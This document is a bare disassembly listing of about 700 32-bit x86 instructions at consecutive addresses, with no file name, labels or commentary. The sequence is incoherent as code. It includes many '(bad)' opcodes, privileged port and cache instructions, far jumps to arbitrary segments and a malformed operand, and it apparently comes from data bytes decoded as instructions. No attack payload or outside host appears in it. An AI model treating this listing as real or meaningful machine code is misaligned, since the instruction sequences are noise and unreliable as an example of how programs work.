  4b9158:	mov    eax,0xfaaf89b5
  4b915d:	cdq    
  4b915e:	arpl   WORD PTR [esi+esi*4],cx
  4b9161:	mov    dl,BYTE PTR [ebx+0x269080af]
  4b9167:	pop    ss
  4b9168:	dec    esp
  4b9169:	push   edi
  4b916a:	(bad)  
  4b916b:	cmp    BYTE PTR [edx],ch
  4b916d:	pop    esi
  4b916e:	lds    eax,FWORD PTR [ebp-0x15]
  4b9171:	adc    BYTE PTR [ebp+0x32e4204c],al
  4b9177:	add    al,0x2f
  4b9179:	push   ecx
  4b917a:	sbb    BYTE PTR [edi],ah
  4b917c:	dec    edi
  4b917d:	repz sti 
  4b917f:	mov    eax,0x970746c0
  4b9184:	ret    0xfc3e
  4b9187:	pop    ebx
  4b9188:	nop
  4b9189:	mov    eax,ds:0x8fc1a029
  4b918e:	and    BYTE PTR [eax],cl
  4b9190:	lahf   
  4b9191:	gs ins BYTE PTR es:[edi],dx
  4b9193:	jg     0x4b91c6
  4b9195:	or     al,0x61
  4b9197:	xor    esp,DWORD PTR [esp+esi*1+0x180d08a0]
  4b919e:	jl     0x4b91f3
  4b91a0:	pop    es
  4b91a1:	xchg   edx,eax
  4b91a2:	daa    
  4b91a3:	out    0x59,al
  4b91a5:	dec    eax
  4b91a6:	inc    edi
  4b91a7:	nop
  4b91a8:	jbe    0x4b9187
  4b91aa:	mov    bh,0x32
  4b91ac:	sbb    esp,DWORD PTR [edx+0x14]
  4b91af:	retf   
  4b91b0:	aam    0x59
  4b91b2:	xchg   esp,eax
  4b91b3:	dec    edx
  4b91b4:	shl    ah,0x1c
  4b91b7:	test   BYTE PTR [edi-0x2d],dl
  4b91ba:	aam    0x56
  4b91bc:	push   ss
  4b91bd:	or     BYTE PTR [esi+0x62],bh
  4b91c0:	mov    edi,0x979b7329
  4b91c5:	dec    ecx
  4b91c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b91c7:	jmp    0x4b91cf
  4b91c9:	mov    cl,0x28
  4b91cb:	mov    cl,0x81
  4b91cd:	(bad)  
  4b91ce:	pop    edx
  4b91cf:	jmp    0xdf25e8b3
  4b91d4:	nop
  4b91d5:	(bad)  
  4b91d6:	dec    edi
  4b91d7:	cmp    al,BYTE PTR [eax+0x75]
  4b91da:	inc    esp
  4b91db:	cs inc edx
  4b91dd:	dec    esi
  4b91de:	sub    BYTE PTR ds:0xf24f2a2,ah
  4b91e4:	xor    esp,DWORD PTR [esi+esi*2]
  4b91e7:	stc    
  4b91e8:	and    al,0x4
  4b91ea:	nop
  4b91eb:	in     al,0xfe
  4b91ed:	leave  
  4b91ee:	mov    eax,DWORD PTR [eax]
  4b91f0:	adc    edx,DWORD PTR ds:0x548c4928
  4b91f6:	sbb    ebx,ebx
  4b91f8:	inc    ebx
  4b91f9:	cmp    eax,edx
  4b91fb:	jl     0x4b91a5
  4b91fd:	pop    ds
  4b91fe:	jmp    0x4b9198
  4b9200:	xchg   ebp,eax
  4b9201:	mov    bh,BYTE PTR [ecx]
  4b9203:	pop    ebp
  4b9204:	or     al,0xb2
  4b9206:	test   eax,0x4eef05ca
  4b920b:	cmovne eax,DWORD PTR [ecx]
  4b920e:	(bad)  
  4b920f:	sub    ebp,edx
  4b9211:	repz mov edx,0xf7ec07c5
  4b9217:	ficomp WORD PTR ds:0x945a94a7
  4b921d:	sub    eax,0x3593510c
  4b9222:	retf   
  4b9223:	sub    al,0x7b
  4b9225:	mov    ch,0x9a
  4b9227:	dec    esi
  4b9228:	int    0x1b
  4b922a:	pop    ds
  4b922b:	adc    al,bl
  4b922d:	pusha  
  4b922e:	mov    ah,0xdd
  4b9230:	sub    esp,ebp
  4b9232:	test   al,0x2d
  4b9234:	leave  
  4b9235:	loopne 0x4b922e
  4b9237:	inc    esi
  4b9238:	jns    0x4b9241
  4b923a:	dec    eax
  4b923b:	pop    ebx
  4b923c:	in     eax,dx
  4b923d:	movsx  ebx,WORD PTR [edi+0x2a]
  4b9241:	mov    bh,0xb6
  4b9243:	add    BYTE PTR [ebx+0xa],0x20
  4b9247:	jg     0x4b9295
  4b9249:	rol    DWORD PTR [ebx+edi*8],0xeb
  4b924d:	jg     0x4b922c
  4b924f:	das    
  4b9250:	addr16 inc ecx
  4b9252:	pop    es
  4b9253:	mov    al,ds:0xebb86483
  4b9258:	adc    cl,BYTE PTR [esi+0x27482075]
  4b925e:	lods   eax,DWORD PTR ds:[esi]
  4b925f:	dec    ecx
  4b9260:	jmp    0x4b9299
  4b9262:	mov    cl,0xe4
  4b9264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b9265:	mov    ebp,0x554d3a4e
  4b926a:	pop    ss
  4b926b:	cmp    eax,0x334a4b08
  4b9270:	push   ebp
  4b9271:	(bad)  
  4b9272:	mov    edi,0xa1238032
  4b9277:	inc    edx
  4b9278:	dec    edx
  4b9279:	mov    al,ds:0x14e09286
  4b927e:	push   esp
  4b927f:	out    0x5d,al
  4b9281:	mov    ah,0xfe
  4b9283:	or     edi,DWORD PTR [edi+0x14]
  4b9286:	dec    ecx
  4b9287:	daa    
  4b9288:	inc    esp
  4b9289:	stc    
  4b928a:	mov    esi,0xf1e91042
  4b928f:	les    eax,FWORD PTR [esi+0x7]
  4b9292:	(bad)
  4b9295:	sahf   
  4b9296:	out    0xdb,eax
  4b9298:	xchg   esi,eax
  4b9299:	stos   DWORD PTR es:[edi],eax
  4b929a:	pusha  
  4b929b:	mov    dh,ah
  4b929d:	idiv   DWORD PTR [esi]
  4b929f:	int    0x37
  4b92a1:	lds    eax,FWORD PTR [edi]
  4b92a3:	pop    ds
  4b92a4:	lds    esi,FWORD PTR [edi]
  4b92a6:	pop    es
  4b92a7:	dec    ecx
  4b92a8:	lds    ebp,FWORD PTR [esi+0x679e7524]
  4b92ae:	test   edi,esp
  4b92b0:	inc    esp
  4b92b1:	ins    BYTE PTR es:[edi],dx
  4b92b2:	jmp    0x4b931d
  4b92b4:	inc    eax
  4b92b5:	fnstenv [ebp+0x56c99266]
  4b92bb:	xor    ebx,DWORD PTR [edx]
  4b92bd:	inc    esp
  4b92be:	lds    ebx,FWORD PTR [eax+edx*2]
  4b92c1:	adc    bh,BYTE PTR [edx]
  4b92c3:	mov    ds:0x15011487,eax
  4b92c8:	inc    edx
  4b92c9:	(bad)  
  4b92ca:	xchg   esp,eax
  4b92cb:	sub    BYTE PTR ds:0x2b84358d,0x8d
  4b92d2:	clc    
  4b92d3:	clc    
  4b92d4:	js     0x4b928c
  4b92d6:	faddp  st(7),st
  4b92d8:	jbe    0x4b930f
  4b92da:	leave  
  4b92db:	aam    0xa
  4b92dd:	push   eax
  4b92de:	fcom   st(4)
  4b92e0:	dec    ecx
  4b92e1:	fisubr DWORD PTR [esi]
  4b92e3:	and    dl,BYTE PTR [ebx]
  4b92e5:	ja     0x4b92f1
  4b92e7:	cmp    DWORD PTR [edx],ecx
  4b92e9:	xor    eax,0xe909e007
  4b92ee:	jmp    0x4b933d
  4b92f0:	jmp    0xc5a7a689
  4b92f5:	sub    al,al
  4b92f7:	dec    ebp
  4b92f8:	mov    DWORD PTR [esi-0x7ff0afa6],edi
  4b92fe:	sub    BYTE PTR [ebx+0x212e9314],dh
  4b9304:	inc    edx
  4b9305:	stc    
  4b9306:	push   ds
  4b9307:	cld    
  4b9308:	daa    
  4b9309:	and    DWORD PTR [ebp+0x11],0x538590c6
  4b9310:	fidiv  WORD PTR [ebx+0x176a6d6e]
  4b9316:	push   0x6d
  4b9318:	jmp    0x646b:0x7805020
  4b931f:	or     al,0x28
  4b9321:	mov    dl,0x6b
  4b9323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b9324:	inc    edx
  4b9325:	jo     0x4b9395
  4b9327:	mov    bh,0x3
  4b9329:	add    DWORD PTR [edi-0x6bfd4d95],edx
  4b932f:	xchg   BYTE PTR [eax],dl
  4b9331:	mov    BYTE PTR [esi-0x4a5b9700],dh
  4b9337:	ret    0x511d
  4b933a:	loopne 0x4b9378
  4b933c:	push   edx
  4b933d:	xchg   edx,eax
  4b933e:	push   eax
  4b933f:	lock and al,0xb1
  4b9342:	(bad)  
  4b9343:	pop    ss
  4b9344:	xor    BYTE PTR [ecx-0x2fa2b8e6],0x4c
  4b934b:	mov    bh,0xf1
  4b934d:	ins    BYTE PTR es:[edi],dx
  4b934e:	dec    ecx
  4b934f:	(bad)  
  4b9350:	pxor   mm0,mm4
  4b9353:	and    DWORD PTR [esi+eax*2],eax
  4b9356:	add    edi,ecx
  4b9358:	mov    ds:0x82d04aa8,eax
  4b935d:	fidivr WORD PTR [edi-0x59]
  4b9360:	and    al,0x44
  4b9362:	mov    ah,0xa5
  4b9364:	or     ecx,DWORD PTR [ebx+0x51037a7d]
  4b936a:	test   al,0xc
  4b936c:	xor    eax,0xed032901
  4b9371:	mov    ecx,DWORD PTR [ecx]
  4b9373:	fs dec edx
  4b9375:	pop    esi
  4b9376:	adc    eax,0x29dcd16c
  4b937b:	sbb    al,0x82
  4b937d:	xchg   BYTE PTR [esi+0x10f0164],al
  4b9383:	or     al,0x54
  4b9385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b9386:	in     al,0x57
  4b9388:	mov    WORD PTR [edx+0x2d3d4471],gs
  4b938e:	jae    0x4b93b4
  4b9390:	jo     0x4b932a
  4b9392:	or     al,BYTE PTR [eax]
  4b9394:	sbb    ecx,DWORD PTR [esi]
  4b9396:	push   es
  4b9397:	and    al,0xbb
  4b9399:	les    ebp,FWORD PTR [edx+0x49]
  4b939c:	inc    ebp
  4b939d:	jp     0x4b9350
  4b939f:	xchg   edx,eax
  4b93a0:	cmp    ah,BYTE PTR [eax]
  4b93a2:	push   ss
  4b93a3:	jo     0x4b9367
  4b93a5:	mov    ecx,0xe3509bc0
  4b93aa:	jnp    0x4b939a
  4b93ac:	in     al,0x12
  4b93ae:	(bad)  
  4b93af:	or     esi,DWORD PTR [ecx-0x4e]
  4b93b2:	ins    BYTE PTR es:[edi],dx
  4b93b3:	sub    bl,ch
  4b93b5:	sub    eax,0x1dc416a
  4b93ba:	scas   al,BYTE PTR es:[edi]
  4b93bb:	ja     0x4b93d4
  4b93bd:	stc    
  4b93be:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4b93c0:	jbe    0x4b93dd
  4b93c2:	test   al,0x1e
  4b93c4:	lods   eax,DWORD PTR ds:[esi]
  4b93c5:	mov    ebx,0x8487c83
  4b93ca:	sbb    DWORD PTR [eax+0x6d],0x62605732
  4b93d1:	pop    ecx
  4b93d2:	xchg   edi,eax
  4b93d3:	enter  0x2d41,0x28
  4b93d7:	cdq    
  4b93d8:	rcr    BYTE PTR [eax+0x407ba404],0x35
  4b93df:	lods   eax,DWORD PTR ds:[esi]
  4b93e0:	dec    ebp
  4b93e1:	jg     0x4b93d5
  4b93e3:	and    ah,al
  4b93e5:	mov    dl,0x9a
  4b93e7:	inc    ebx
  4b93e8:	repnz inc edx
  4b93ea:	push   ebx
  4b93eb:	push   esp
  4b93ec:	ins    BYTE PTR es:[edi],dx
  4b93ed:	sbb    BYTE PTR [edi-0x49d7b5de],0xbc
  4b93f4:	or     al,0xf8
  4b93f6:	cmp    al,0xb4
  4b93f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b93f9:	imul   ebp,ebp,0xd404d020
  4b93ff:	fcomp  st(4)
  4b9401:	and    al,0xe0
  4b9403:	in     al,dx
  4b9404:	or     bl,cl
  4b9406:	and    DWORD PTR [esi+0x7eb61238],esp
  4b940c:	add    al,bh
  4b940e:	ret    0x53b9
  4b9411:	mov    ebx,0x6ca3c646
  4b9416:	in     eax,dx
  4b9417:	aad    0x4e
  4b9419:	xchg   ebp,eax
  4b941a:	imul   ebx,DWORD PTR [edi+0x5d3e19f6],0x3b8c1014
  4b9424:	repz push cs
  4b9426:	test   BYTE PTR [ebx+0x43],cl
  4b9429:	inc    ebp
  4b942a:	jmp    0x4b9482
  4b942c:	scas   eax,DWORD PTR es:[edi]
  4b942d:	test   DWORD PTR [eax+0x43],esp
  4b9430:	sbb    eax,eax
  4b9432:	out    0xc1,al
  4b9434:	popf   
  4b9435:	add    DWORD PTR [esi],esp
  4b9437:	push   edx
  4b9438:	pop    edx
  4b9439:	dec    edi
  4b943a:	invd   
  4b943c:	es xchg ebx,eax
  4b943e:	add    bh,BYTE PTR [edx-0x8]
  4b9441:	ds xchg ebx,eax
  4b9443:	shl    BYTE PTR [ebp+0x1c],1
  4b9446:	call   FWORD PTR [eax-0x12]
  4b9449:	push   ebx
  4b944a:	push   0x38
  4b944c:	sub    dl,bh
  4b944e:	mov    al,0x6e
  4b9450:	mov    ecx,0xd44910
  4b9455:	or     eax,edx
  4b9457:	ins    DWORD PTR es:[edi],dx
  4b9458:	jo     0x4b940b
  4b945a:	dec    ecx
  4b945b:	adc    al,bh
  4b945d:	es cmc 
  4b945f:	inc    edx
  4b9460:	inc    eax
  4b9461:	jl     0x4b9444
  4b9463:	inc    ebp
  4b9464:	dec    ebx
  4b9465:	js     0x4b946d
  4b9467:	jmp    0x2dc0:0xa2ec22b6
  4b946e:	dec    eax
  4b946f:	push   edx
  4b9470:	dec    edx
  4b9471:	ins    BYTE PTR es:[edi],dx
  4b9472:	dec    ebx
  4b9473:	dec    ecx
  4b9474:	or     eax,0xf84df939
  4b9479:	push   ecx
  4b947a:	rcr    BYTE PTR [esi-0x15e82fbe],cl
  4b9480:	cld    
  4b9481:	add    DWORD PTR [eax],0xfffffffe
  4b9484:	dec    edi
  4b9485:	loope  0x4b9457
  4b9487:	or     dl,BYTE PTR [esi]
  4b9489:	adc    edx,eax
  4b948b:	ret    0x1a90
  4b948e:	sbb    al,0x68
  4b9490:	push   esi
  4b9491:	aam    0x73
  4b9493:	adc    dh,BYTE PTR [eax-0x6b]
  4b9496:	jnp    0x4b9474
  4b9498:	lock ror DWORD PTR [esi],0xde
  4b949c:	xor    al,0xd6
  4b949e:	push   edx
  4b949f:	mov    al,ds:0xb58dcce8
  4b94a4:	sub    al,0x99
  4b94a6:	fiadd  DWORD PTR [ebx+edx*4+0x443de8c4]
  4b94ad:	test   eax,0x93058fea
  4b94b2:	pop    ss
  4b94b3:	cmp    al,0xf4
  4b94b5:	push   ecx
  4b94b6:	mov    edi,eax
  4b94b8:	mov    bh,BYTE PTR [ebp+0x36]
  4b94bb:	sbb    BYTE PTR cs:[edx-0x76],bh
  4b94bf:	rol    BYTE PTR [ecx+0x60501cff],1
  4b94c5:	pop    es
  4b94c6:	sub    ebp,DWORD PTR [ebp+0x13974cb2]
  4b94cc:	jnp    0x4b94de
  4b94ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b94cf:	(bad)  
  4b94d0:	daa    
  4b94d1:	inc    ebp
  4b94d2:	push   ebx
  4b94d3:	fild   WORD PTR [edi+eax*4-0x58]
  4b94d7:	das    
  4b94d8:	push   esp
  4b94d9:	enter  0x2d0d,0x29
  4b94dd:	jge    0x4b953e
  4b94df:	xchg   ebx,eax
  4b94e0:	mov    al,0x8b
  4b94e2:	jp     0x4b949c
  4b94e4:	push   edx
  4b94e5:	and    BYTE PTR [ebx-0x3d6fda5e],ah
  4b94eb:	mov    ?,ebp
  4b94ed:	mov    dh,0x85
  4b94ef:	int    0x9e
  4b94f1:	hlt    
  4b94f2:	mov    eax,0x1a756228
  4b94f7:	or     al,0xd
  4b94f9:	in     eax,dx
  4b94fa:	mov    ebx,0x5053e8cd
  4b94ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b9500:	adc    BYTE PTR [eax+0x42],bl
  4b9503:	rcl    BYTE PTR [edi],1
  4b9505:	fwait
  4b9506:	push   eax
  4b9507:	out    dx,eax
  4b9508:	inc    ebp
  4b9509:	cmp    DWORD PTR [esi+ebx*2],eax
  4b950c:	sub    DWORD PTR [ecx+0x3874068b],ecx
  4b9512:	lds    edx,FWORD PTR [eax+0x1df0c0c]
  4b9518:	push   ebp
  4b9519:	pop    ss
  4b951a:	cmp    DWORD PTR [ebp-0x75ada37c],eax
  4b9520:	xchg   ebx,eax
  4b9521:	xchg   DWORD PTR ds:[ecx+0x2c],esp
  4b9525:	cmp    al,0xa8
  4b9527:	mov    dh,0x19
  4b9529:	popa   
  4b952a:	pusha  
  4b952b:	arpl   WORD PTR [ecx+0x328046bb],si
  4b9531:	sub    DWORD PTR [ecx+0x2e759485],ebp
  4b9537:	xlat   BYTE PTR ds:[ebx]
  4b9538:	ret    0x9ce
  4b953b:	pop    ss
  4b953c:	push   0x5e248b0c
  4b9541:	inc    edi
  4b9542:	add    DWORD PTR [esi+0x446654c1],eax
  4b9548:	rol    DWORD PTR ds:0xcd80c83e,cl
  4b954e:	jne    0x4b95a7
  4b9550:	push   edx
  4b9551:	aad    0x0
  4b9553:	mov    ds:0x4d50b12,al
  4b9558:	add    edi,DWORD PTR [ebx+0x5d0b06ee]
  4b955e:	push   es
  4b955f:	test   ebx,ebp
  4b9561:	sbb    esp,DWORD PTR [ecx+0x6d4ef763]
  4b9567:	dec    ebp
  4b9568:	sar    BYTE PTR [ebx-0x1a],0x6f
  4b956c:	push   edx
  4b956d:	or     eax,0xb4b81da5
  4b9572:	(bad)  
  4b9573:	std    
  4b9574:	jnp    0x4b95ae
  4b9576:	pop    eax
  4b9577:	daa    
  4b9578:	iret   
  4b9579:	xchg   edi,eax
  4b957a:	repz adc al,0x70
  4b957d:	ds sub eax,0xbc254f06
  4b9583:	sub    eax,0x67261dd5
  4b9588:	sbb    al,0x3e
  4b958a:	xor    eax,DWORD PTR [ecx-0x5e]
  4b958d:	add    esp,DWORD PTR [eax]
  4b958f:	and    BYTE PTR [ebx],dh
  4b9591:	pushf  
  4b9592:	test   BYTE PTR [esi],0x48
  4b9595:	sub    BYTE PTR [edi-0x3f8b4feb],dl
  4b959b:	add    al,0x6e
  4b959d:	cmp    ah,ah
  4b959f:	mov    esi,edi
  4b95a1:	stc    
  4b95a2:	pop    ds
  4b95a3:	mov    eax,0x75998584
  4b95a8:	dec    edx
  4b95a9:	mov    ecx,0xa6670105
  4b95ae:	xchg   edx,eax
  4b95af:	mov    cl,0x2
  4b95b1:	cmp    eax,DWORD PTR [ecx]
  4b95b3:	and    BYTE PTR ds:0x6fa04186,dl
  4b95b9:	add    DWORD PTR [edx],ebx
  4b95bb:	sbb    BYTE PTR [eax],dh
  4b95bd:	xor    ecx,DWORD PTR [ecx]
  4b95bf:	stos   DWORD PTR es:[edi],eax
  4b95c0:	push   esi
  4b95c1:	xchg   ebp,eax
  4b95c2:	in     eax,0xcb
  4b95c4:	dec    esp
  4b95c5:	bound  ecx,QWORD PTR [edx+0x5d]
  4b95c8:	and    bh,ah
  4b95ca:	daa    
  4b95cb:	add    DWORD PTR [esi+eax*4-0x3d],0x38
  4b95d0:	aas    
  4b95d1:	cmp    DWORD PTR [ecx-0x1a],ebp
  4b95d4:	xchg   esi,eax
  4b95d5:	jne    0x4b9559
  4b95d7:	or     DWORD PTR [ebx+0x149c91f0],ecx
  4b95dd:	dec    edx
  4b95de:	loopne 0x4b9620
  4b95e0:	(bad)  
  4b95e1:	int    0x5d
  4b95e3:	inc    ebx
  4b95e4:	adc    bh,BYTE PTR [bx+di+0x45]
  4b95e8:	mov    BYTE PTR [esi-0x6b],ah
  4b95eb:	xchg   ecx,eax
  4b95ec:	sub    BYTE PTR [ebx+eax*8],dl
  4b95ef:	stos   DWORD PTR es:[edi],eax
  4b95f0:	inc    eax
  4b95f1:	pop    ebp
  4b95f2:	inc    esp
  4b95f3:	jo     0x4b95f6
  4b95f5:	jnp    0x4b9578
  4b95f7:	sub    eax,DWORD PTR ds:0x8822119e
  4b95fd:	inc    esi
  4b95fe:	es xchg edi,eax
  4b9600:	xor    al,0xd
  4b9602:	loopne 0x4b9630
  4b9604:	xor    BYTE PTR [esi],cl
  4b9606:	or     edx,DWORD PTR [eax]
  4b9608:	inc    ecx
  4b9609:	inc    esi
  4b960a:	shl    DWORD PTR [ebx+edi*2-0x2e],cl
  4b960e:	nop
  4b960f:	test   al,0xcd
  4b9611:	xor    BYTE PTR [esi+esi*4-0x2d],dh
  4b9615:	dec    eax
  4b9616:	cs iret 
  4b9618:	push   ss
  4b9619:	cmp    cl,cl
  4b961b:	cmp    BYTE PTR [ecx+0xb352521],cl
  4b9621:	(bad)  
  4b9622:	mov    fs,WORD PTR [edx]
  4b9624:	imul   edi,DWORD PTR [edx+eax*1+0x5ae4b1b0],0x22
  4b962c:	test   BYTE PTR [ebx-0x297fb28a],bh
  4b9632:	cmp    eax,DWORD PTR [eax]
  4b9634:	loopne 0x4b964a
  4b9636:	mov    dl,0xda
  4b9638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b9639:	jge    0x4b9682
  4b963b:	jp     0x4b9623
  4b963d:	adc    al,0x2
  4b963f:	or     bh,bh
  4b9641:	push   esi
  4b9642:	out    0x2c,al
  4b9644:	loopne 0x4b964e
  4b9646:	adc    cl,BYTE PTR [eax+esi*8+0x4f]
  4b964a:	xchg   esi,eax
  4b964b:	jns    0x4b9674
  4b964d:	add    BYTE PTR [ebp+0x301b1055],ah
  4b9653:	cwde   
  4b9654:	mov    edi,DWORD PTR [ebx]
  4b9656:	push   edx
  4b9657:	or     eax,0xd6807d61
  4b965c:	push   esi
  4b965d:	cli    
  4b965e:	imul   DWORD PTR [ecx+eiz*8+0x4a]
  4b9662:	jmp    0x82a0:0x2b1d447
  4b9669:	push   esi
  4b966a:	jmp    0x4b961e
  4b966c:	test   BYTE PTR [eax+0x48],dl
  4b966f:	lods   al,BYTE PTR ds:[esi]
  4b9670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b9671:	cwde   
  4b9672:	adc    al,0x75
  4b9674:	mov    ah,0x8a
  4b9676:	mov    BYTE PTR [ebx],0xd8
  4b9679:	es mov ah,0x4
  4b967c:	mov    eax,0xd05eac36
  4b9681:	imul   edi,DWORD PTR [edi],0x5370eb74
  4b9687:	(bad)  
  4b9688:	dec    eax
  4b9689:	leave  
  4b968a:	ja     0x4b96f5
  4b968c:	push   esi
  4b968d:	inc    edx
  4b968e:	cwde   
  4b968f:	inc    ecx
  4b9690:	jae    0x4b962e
  4b9692:	lea    esi,[ecx]
  4b9694:	cmp    al,0x4b
  4b9696:	push   esp
  4b9697:	push   es
  4b9698:	arpl   WORD PTR [eax],bp
  4b969a:	mov    al,ds:0x16cb4290
  4b969f:	xor    BYTE PTR [ebx+0x53],al
  4b96a2:	sub    DWORD PTR [edx-0x4c],esi
  4b96a5:	or     DWORD PTR [ecx+0xa031964],ecx
  4b96ab:	mov    esp,DWORD PTR [ecx-0x4afe33a3]
  4b96b1:	jmp    0x32571c23
  4b96b6:	jae    0x4b96ec
  4b96b8:	sbb    BYTE PTR [ecx],0x54
  4b96bb:	fidivr WORD PTR [esi-0x3f9fb4ff]
  4b96c1:	int3   
  4b96c2:	mov    dh,al
  4b96c4:	and    al,dl
  4b96c6:	add    al,0xb2
  4b96c8:	je     0x4b96e8
  4b96ca:	mov    esp,0xad824030
  4b96cf:	adc    eax,0xced45614
  4b96d4:	add    BYTE PTR [esp],ah
  4b96d7:	sub    al,0xa8
  4b96d9:	lods   al,BYTE PTR ds:[esi]
  4b96da:	mov    WORD PTR [esi+0x106c1135],fs
  4b96e0:	call   0xa63892e9
  4b96e5:	dec    esp
  4b96e6:	and    al,0xa4
  4b96e8:	test   eax,0xd29488b
  4b96ed:	sub    esp,ebx
  4b96ef:	mov    bl,0xb
  4b96f1:	xor    BYTE PTR [eax],0x52
  4b96f4:	sub    eax,0x9be16c98
  4b96f9:	and    ah,bl
  4b96fb:	mov    ch,0x13
  4b96fd:	ret    0x34c8
  4b9700:	popf   
  4b9701:	sbb    ebx,DWORD PTR [edx+0x539062be]
  4b9707:	nop
  4b9708:	cwde   
  4b9709:	enter  0xbb62,0x83
  4b970d:	loopne 0x4b972b
  4b970f:	test   DWORD PTR [ecx+0x6a],edx
  4b9712:	adc    eax,0xd156cc6c
  4b9717:	sub    al,0xcc
  4b9719:	xchg   esp,eax
  4b971a:	lds    ecx,FWORD PTR [eax-0x2fa398ce]
  4b9720:	ds or  eax,esp
  4b9723:	push   edx
  4b9724:	mov    eax,0x2b50b730
  4b9729:	or     cl,BYTE PTR [edi+0x4b0405b4]
  4b972f:	popf   
  4b9730:	lods   eax,DWORD PTR ds:[esi]
  4b9731:	lods   al,BYTE PTR ds:[esi]
  4b9732:	inc    esi
  4b9733:	dec    eax
  4b9734:	ds adc eax,0xc30cc13b
  4b973a:	cmp    eax,0x44cdbd3c
  4b973f:	pop    ss
  4b9740:	es push cs
  4b9742:	or     DWORD PTR [edi],ebp
  4b9744:	jns    0x4b970a
  4b9746:	nop
  4b9747:	add    al,0xc
  4b9749:	sbb    BYTE PTR [edx+0x12337818],0xdf
  4b9750:	in     al,0x16
  4b9752:	int3   
  4b9753:	jo     0x4b96ec
  4b9755:	jne    0x4b972d
  4b9757:	mov    ebp,0xcc45a334
  4b975c:	aad    0x88
  4b975e:	add    al,0x3e
  4b9760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b9761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b9762:	nop
  4b9763:	push   cs
  4b9764:	jmp    0xb74d:0x88c13c05
  4b976b:	scas   al,BYTE PTR es:[edi]
  4b976c:	data16 aas 
  4b976e:	mov    esi,0x408d21dd
  4b9773:	xchg   bh,cl
  4b9775:	out    dx,eax
  4b9776:	xor    al,0xa6
  4b9778:	jo     0x4b97d2
  4b977a:	push   eax
  4b977b:	jge    0x4b970a
  4b977d:	cwde   
  4b977e:	mov    edx,0xe57f5481
  4b9783:	je     0x4b97c7
  4b9785:	mov    DWORD PTR [esi-0xefb00b5],esi
  4b978b:	bound  ecx,QWORD PTR ds:[eax+0x2bc61a5d]
  4b9792:	push   cs
  4b9793:	idiv   ebx
  4b9795:	dec    ebx
  4b9796:	daa    
  4b9797:	dec    esp
  4b9798:	jnp    0x4b97af
  4b979a:	cmp    al,0xfa
  4b979c:	mov    ax,ds:0x7bd20a40
  4b97a2:	ret    0xdc0b
  4b97a5:	jp     0x4b980d
  4b97a7:	cmp    ch,BYTE PTR [eax+esi*2]
  4b97aa:	and    BYTE PTR [ecx],0xee
  4b97ad:	mov    bh,0x33
  4b97af:	ja     0x4b978d
  4b97b1:	push   ebp
  4b97b2:	mov    eax,ds:0x37b9108a
  4b97b7:	test   bl,cl
  4b97b9:	or     BYTE PTR [ebp+0x5c],0xaa
  4b97bd:	adc    edx,edi
  4b97bf:	ss cmp al,0x6d
  4b97c2:	mov    eax,ds:0xed21f61
  4b97c7:	add    ch,al
  4b97c9:	pop    ebx
  4b97ca:	add    eax,DWORD PTR [edi+0x2b]
  4b97cd:	or     BYTE PTR [eax+0x274b425],dh
  4b97d3:	inc    ebx
  4b97d4:	rcr    ah,0x28
  4b97d7:	sbb    eax,DWORD PTR [esi]
  4b97d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b97da:	jo     0x4b980b
  4b97dc:	inc    edi
  4b97dd:	sbb    esp,DWORD PTR [ecx]
  4b97df:	mov    esp,0x4857ce6a
  4b97e4:	sbb    DWORD PTR fs:[edi],ecx
  4b97e7:	nop
  4b97e8:	or     eax,DWORD PTR [edi+0x7]
  4b97eb:	enter  0x740d,0x22
  4b97ef:	jbe    0x4b97f1
  4b97f1:	push   edi
  4b97f2:	outs   dx,DWORD PTR ds:[esi]
  4b97f3:	inc    esp
  4b97f4:	dec    edx
  4b97f5:	or     cl,BYTE PTR [edi-0x60]
  4b97f8:	or     al,0x83
  4b97fa:	loope  0x4b980d
  4b97fc:	inc    ebx
  4b97fd:	sub    BYTE PTR [edi-0x15],dh
  4b9800:	stos   DWORD PTR es:[edi],eax
  4b9801:	ret    
  4b9802:	femms  
  4b9804:	pop    edi
  4b9805:	shl    BYTE PTR [eax-0x34],0xef
  4b9809:	jg     0x4b9851
  4b980b:	pop    ebx
  4b980c:	mov    ecx,0x7706ae6b
  4b9811:	and    al,0x7f
  4b9813:	sub    al,0x55
  4b9815:	push   esi
  4b9816:	cs mov bh,0xeb
  4b9819:	adc    BYTE PTR [ecx+edx*2],cl
  4b981c:	jne    0x4b9861
  4b981e:	xor    eax,0xcc245019
  4b9823:	xchg   ecx,eax
  4b9824:	mov    cl,0x1
  4b9826:	test   eax,0x23cff081
  4b982b:	les    esi,FWORD PTR ds:0x326d4821
  4b9831:	pop    ds
  4b9832:	jb     0x4b9808
  4b9834:	mov    ds:0x206c508c,eax
  4b9839:	xlat   BYTE PTR ds:[ebx]
  4b983a:	scas   eax,DWORD PTR es:[edi]
  4b983b:	mov    eax,ds:0x275e8ebe
  4b9840:	gs shl al,cl
  4b9843:	or     eax,0x206e1422
  4b9848:	outs   dx,DWORD PTR ds:[esi]
  4b9849:	retf   
  4b984a:	inc    ebx
  4b984b:	mov    BYTE PTR [eax],al
  4b984d:	xor    eax,0x23ea5868
  4b9852:	pop    ds
  4b9853:	outs   dx,BYTE PTR ds:[esi]
  4b9854:	xor    cl,al
  4b9856:	push   eax
  4b9857:	pop    eax
  4b9858:	sti    
  4b9859:	dec    eax
  4b985a:	ror    DWORD PTR [ecx],0xbc
  4b985d:	sub    al,0xb4
  4b985f:	jge    0x4b97e4
  4b9861:	sub    edi,DWORD PTR [eax+eiz*1-0x2b]
  4b9865:	mov    esi,0x5f249d29
  4b986a:	out    dx,al
  4b986b:	jo     0x4b98c6
  4b986d:	mov    ah,0x1
  4b986f:	mov    ebx,0x107a575b
  4b9874:	(bad)  
  4b9875:	stc    
  4b9876:	sahf   
